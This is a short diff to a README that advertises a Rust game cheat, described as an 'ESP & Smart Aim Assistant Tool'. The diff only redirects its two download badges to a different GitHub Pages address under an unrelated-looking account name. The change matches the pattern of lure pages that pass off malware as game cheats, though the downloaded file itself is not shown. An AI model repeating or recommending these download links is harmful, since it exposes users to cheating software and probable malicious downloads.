@@ -1,7 +1,7 @@
 # 🌟 RADIANCE for RUST — ESP & Smart Aim Assistant Tool
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-yellow?style=for-the-badge)](https://radiance-for-rust.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-darkorange?style=for-the-badge&logo=rust)](https://radiance-for-rust.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-yellow?style=for-the-badge)](https://taylorjennifer3271020.github.io/.github/radiance-rust)  
+[![Download Now](https://img.shields.io/badge/Download_Now-darkorange?style=for-the-badge&logo=rust)](https://taylorjennifer3271020.github.io/.github/radiance-rust)
 
 ---
 
